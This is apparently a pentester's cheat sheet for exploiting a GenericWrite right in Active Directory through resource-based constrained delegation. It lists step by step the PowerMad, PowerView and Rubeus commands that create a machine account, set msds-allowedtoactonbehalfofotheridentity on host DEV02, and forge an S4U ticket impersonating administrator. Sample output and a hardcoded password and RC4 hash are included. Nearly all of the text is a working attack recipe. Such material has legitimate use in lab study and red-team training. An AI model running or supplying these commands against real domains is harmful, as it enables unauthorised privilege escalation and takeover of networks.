# PowerMad Methode - Exploiting Generic Write Right

1. Create a new machine using PowerMad

```PowerShell
New-MachineAccount -MachineAccount volkenComputer -Password $(ConvertTo-SecureString 'h4xh4x!' -AsPlainText -Force) -Domain dev.sinhack.com
[+] Machine account volkenComputer added
```

2. Give it the rights using PowerView.

```PowerShell
$sid =Get-DomainComputer -Identity volkenComputer -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"

$SDbytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDbytes,0)

Get-DomainComputer -Identity DEV02 -Domain dev.sinhack.com | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

$RBCDbytes = Get-DomainComputer DEV02 -Domain dev.sinhack.com -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity

$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0

$Descriptor.DiscretionaryAcl

# Output
BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-2032401531-514583578-4118054891-6101
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None

OPS\volkenComputer$
```

3. Confirm it's SID.

```PowerShell
ConvertFrom-SID S-1-5-21-2032401531-514583578-4118054891-6101
```

4. As Administrator run Rubeus to steal ticket.

```bash
# Hash the password to get is RC4 value.
Rubeus.exe hash /password:h4xh4x!

# Steal the ticket
Rubeus.exe s4u /user:volkenComputer$ /rc4:7D9FE135F52273BA258569D0E5B10D51 /impersonateuser:administrator /msdsspn:CIFS/dev02.dev.sinhack.com /ptt
```

5. Verifyt with klist that the ticket is successfully imported.
